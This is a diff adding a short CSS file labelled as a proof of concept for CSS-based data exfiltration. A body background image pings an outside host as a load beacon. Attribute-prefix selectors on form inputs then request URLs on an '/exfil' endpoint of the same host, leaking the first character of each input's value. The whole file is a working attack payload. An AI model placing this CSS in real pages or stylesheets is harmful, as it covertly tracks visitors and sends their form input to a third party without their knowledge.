@@ -1,0 +1,7 @@
+/* CSS Exfiltration PoC */
+body {
+  background-image: url("https://horizonfps.github.io/track.gif?import-loaded=1") !important;
+}
+/* This would exfiltrate data if there were form inputs */
+input[value^="a"] { background: url("https://horizonfps.github.io/exfil?char=a"); }
+input[value^="b"] { background: url("https://horizonfps.github.io/exfil?char=b"); }
